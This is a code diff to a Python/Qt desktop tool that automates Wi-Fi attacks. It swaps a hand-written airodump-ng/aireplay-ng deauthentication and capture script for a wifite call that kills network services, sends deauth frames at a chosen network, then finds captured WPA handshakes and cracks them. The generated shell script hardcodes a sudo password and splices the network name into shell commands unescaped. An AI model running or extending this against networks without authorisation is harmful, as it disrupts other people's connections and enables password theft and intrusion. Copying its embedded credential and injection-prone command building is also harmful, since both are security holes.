@@ -1069,25 +1069,25 @@ class MaximWindow(QMainWindow):
     _HS_SIGNAL_FILE = "/tmp/maxim_hs_done"
 
     def _capture_handshake(self, essid):
-        """Handshake capture: scan+capture in external terminal, cracking in internal output.
-        Uses wlan1 (external) for monitor mode. wlan0 NEVER touched."""
+        """Handshake capture using wifite: scan+capture+deauth all automatic.
+        Runs in external terminal. Poller watches for .cap with valid handshake,
+        then kills terminal and cracks in MAXIM output window.
+        Uses wlan1 (external) only. wlan0 NEVER touched."""
         import tempfile
 
         iface = "wlan1"
         out_dir = os.path.expanduser("~/Desktop/MAXIMHASH")
         safe_essid = essid.replace(' ', '_').replace("'", "").replace('"', '')
         essid_dir = f"{out_dir}/{safe_essid}"
-        capture_prefix = f"{essid_dir}/{safe_essid}"
-        scan_file = "/tmp/maxim_hscan"
         signal_file = self._HS_SIGNAL_FILE
 
         self.terminal.appendPlainText(f"\n{'═'*60}")
         self.terminal.appendPlainText(f"  HANDSHAKE CAPTURE: {essid}")
-        self.terminal.appendPlainText(f"  Adapter: {iface}  (wlan0 untouched)")
+        self.terminal.appendPlainText(f"  Tool: wifite  Adapter: {iface}")
         self.terminal.appendPlainText(f"  Output:  {essid_dir}/")
         self.terminal.appendPlainText(f"{'═'*60}")
-        self.terminal.appendPlainText(f"  Scan + capture → external terminal")
-        self.terminal.appendPlainText(f"  Cracking → this output window\n")
+        self.terminal.appendPlainText(f"  wifite runs in external terminal")
+        self.terminal.appendPlainText(f"  When handshake captured → auto-crack here\n")
 
         # Reset guard flag
         self._hs_processing = False
@@ -1098,97 +1098,44 @@ class MaximWindow(QMainWindow):
         except FileNotFoundError:
             pass
 
-        # ── Use nmcli to find BSSID+channel (works regardless of interface state) ──
+        # Build script that runs wifite targeting this ESSID
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
         script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
         script.write(f"mkdir -p '{essid_dir}'\n")
-        script.write(f"rm -f '{signal_file}'\n\n")
+        script.write(f"rm -f '{signal_file}'\n")
+        script.write(f"cd '{essid_dir}'\n\n")
 
-        # Make sure NetworkManager is running and interface is managed
-        script.write(f"echo '[*] Preparing to scan...'\n")
-        script.write("sudo systemctl start NetworkManager 2>/dev/null\n")
-        script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
-        script.write(f"sudo iw dev {iface} set type managed 2>/dev/null\n")
-        script.write(f"sudo ip link set {iface} up 2>/dev/null\n")
-        script.write("sleep 2\n\n")
+        # wifite flags:
+        #   -i wlan1        = use this interface
+        #   --essid MAX     = target this specific network
+        #   --kill           = kill interfering processes (NetworkManager etc)
+        #   --no-pmkid       = skip PMKID, go straight to handshake
+        #   --num-deauths 10 = send 10 deauth frames
+        #   --wpa            = only attack WPA networks
+        script.write(f"sudo wifite -i {iface} --essid '{essid}' --kill --wpa --no-pmkid --num-deauths 10\n\n")
 
-        # nmcli dev wifi list outputs:
-        #   IN-USE  BSSID              SSID        MODE   CHAN  ...
-        #           AA:BB:CC:DD:EE:FF  MAX         Infra  6     ...
-        # Use --rescan yes to force fresh scan
-        # Use -t (terse) for machine-readable colon-separated output
-        # -f BSSID,SSID,CHAN for just the fields we need
-        script.write("BSSID=''\nCHANNEL=''\n")
-        script.write(f"echo '[*] Scanning for {essid}...'\n")
-        script.write("for i in 1 2 3 4 5 6 7 8 9 10; do\n")
-        script.write(f"  echo \"  Attempt $i/10\"\n")
-        # -t = terse (colon-separated), -f = fields, --rescan yes = fresh scan
-        script.write(f"  LINE=$(nmcli -t -f BSSID,SSID,CHAN dev wifi list ifname {iface} --rescan yes 2>/dev/null | grep -i ':{essid}:' | head -1)\n")
-        # If exact match fails, try partial match
-        script.write("  if [ -z \"$LINE\" ]; then\n")
-        script.write(f"    LINE=$(nmcli -t -f BSSID,SSID,CHAN dev wifi list ifname {iface} 2>/dev/null | grep -i '{essid}' | head -1)\n")
-        script.write("  fi\n")
-        script.write("  if [ -n \"$LINE\" ]; then\n")
-        # terse format: AA\\:BB\\:CC\\:DD\\:EE\\:FF:SSID:CHAN
-        # BSSID colons are escaped as \\: in terse mode, SSID and CHAN separated by unescaped :
-        # Extract BSSID (first 17 chars after unescaping) and CHAN (last field)
-        script.write("    BSSID=$(echo \"$LINE\" | sed 's/\\\\\\:/:/g' | cut -c1-17)\n")
-        script.write("    CHANNEL=$(echo \"$LINE\" | rev | cut -d: -f1 | rev)\n")
-        script.write("    if [ -n \"$BSSID\" ] && [ -n \"$CHANNEL\" ]; then\n")
-        script.write("      echo \"  FOUND: BSSID=$BSSID  Channel=$CHANNEL\"\n")
-        script.write("      break\n")
-        script.write("    fi\n")
-        script.write("  fi\n")
-        script.write("  sleep 3\n")
-        script.write("done\n\n")
-
-        # Debug: if not found, show what nmcli sees so user can tell us
-        script.write("if [ -z \"$BSSID\" ] || [ -z \"$CHANNEL\" ]; then\n")
-        script.write(f"  echo '[!] Could not find {essid}'\n")
-        script.write("  echo ''\n")
-        script.write("  echo 'Networks visible:'\n")
-        script.write(f"  nmcli -f BSSID,SSID,CHAN dev wifi list ifname {iface} 2>/dev/null\n")
-        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
-        script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")
-
-        # Kill NetworkManager so it doesn't interfere with monitor mode
-        script.write("sudo airmon-ng check kill 2>/dev/null\n\n")
-
-        # Switch to monitor mode
-        script.write(f"echo '[*] Switching to monitor mode...'\n")
-        script.write(f"sudo ip link set {iface} down\n")
-        script.write(f"sudo iw dev {iface} set type monitor\n")
-        script.write(f"sudo ip link set {iface} up\n")
-        script.write(f"MON={iface}\n\n")
-
-        # Targeted capture + deauth
-        script.write("echo\n")
-        script.write("echo '══════════════════════════════════════════════════════════'\n")
-        script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
-        script.write("echo \"  BSSID: $BSSID  Channel: $CHANNEL\"\n")
-        script.write("echo '  MAXIM will auto-detect and start cracking.'\n")
-        script.write("echo '══════════════════════════════════════════════════════════'\n")
-        script.write("echo\n\n")
-
-        # Deauth in background
-        script.write("(\n  sleep 3\n  for j in $(seq 1 30); do\n")
-        script.write("    sudo aireplay-ng --deauth 10 -a $BSSID $MON >/dev/null 2>&1\n")
-        script.write("    sleep 4\n  done\n) &\n\n")
-
-        # Capture in foreground
-        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' $MON\n\n")
-        script.write("echo 'Capture stopped.'\nread -p 'Press Enter to close'\n")
+        # If wifite exits, write signal so poller knows
+        script.write(f"echo 'DONE' > '{signal_file}'\n")
+        script.write("echo\necho 'wifite finished.'\nread -p 'Press Enter to close'\n")
 
         script.close()
         os.chmod(script.name, 0o755)
 
-        # Open external terminal — GUI stays responsive
+        # Open external terminal
         self.runner.run_in_terminal(f"bash '{script.name}'")
 
-        # Poll for a .cap file that contains a VALID handshake
-        # (airodump creates .cap immediately, but handshake comes later)
+        # Poll for .cap files with valid handshake in:
+        # 1. The essid_dir (cd target)
+        # 2. wifite's default hs/ directory
+        # 3. Current working directory
         self._hs_essid_dir = essid_dir
+        self._hs_wifite_dirs = [
+            essid_dir,
+            os.path.expanduser("~/hs"),
+            os.path.expanduser("~/Desktop/MAXIMHASH"),
+            "/tmp",
+        ]
         self._hs_poll_timer = QTimer()
         self._hs_poll_timer.timeout.connect(self._check_handshake_done)
         self._hs_poll_timer.start(5000)  # Check every 5 seconds
@@ -1225,15 +1172,31 @@ class MaximWindow(QMainWindow):
                 os.remove(signal_file)
             except Exception:
                 content = ""
-            if content in ("FAILED", "NO_CAP"):
+            if content == "FAILED":
                 self._hs_poll_timer.stop()
                 self._hs_essid_dir = None
                 self._hs_processing = False
                 self.terminal.appendPlainText(f"\n[!] Capture failed.\n")
                 return
+            if content == "DONE":
+                # wifite finished — do one final check for .cap files before giving up
+                pass  # fall through to .cap check below
 
-        # Check .cap files for valid handshake (aircrack-ng test)
-        cap_files = sorted(glob.glob(f"{essid_dir}/*.cap"), key=os.path.getmtime, reverse=True)
+        # Check .cap files for valid handshake in all possible directories
+        all_caps = []
+        for search_dir in getattr(self, '_hs_wifite_dirs', [essid_dir]):
+            all_caps.extend(glob.glob(f"{search_dir}/*.cap"))
+            all_caps.extend(glob.glob(f"{search_dir}/**/*.cap", recursive=True))
+        # Deduplicate and sort by modification time (newest first)
+        seen = set()
+        cap_files = []
+        for cf in all_caps:
+            real = os.path.realpath(cf)
+            if real not in seen:
+                seen.add(real)
+                cap_files.append(cf)
+        cap_files.sort(key=lambda f: os.path.getmtime(f), reverse=True)
+
         cap_file = None
         for cf in cap_files:
             if self._cap_has_handshake(cf):
@@ -1241,6 +1204,23 @@ class MaximWindow(QMainWindow):
                 break
 
         if not cap_file:
+            # If wifite already finished (DONE signal) and still no handshake, stop
+            if os.path.exists(signal_file):
+                try:
+                    with open(signal_file, 'r') as f:
+                        sig = f.read().strip()
+                except Exception:
+                    sig = ""
+                if sig == "DONE":
+                    self._hs_poll_timer.stop()
+                    self._hs_essid_dir = None
+                    self._hs_processing = False
+                    try:
+                        os.remove(signal_file)
+                    except Exception:
+                        pass
+                    self.terminal.appendPlainText(f"\n[!] wifite finished but no handshake captured.\n")
+                    return
             return  # No valid handshake yet — keep polling
 
         # Valid handshake found — stop polling, kill external terminal, crack internally
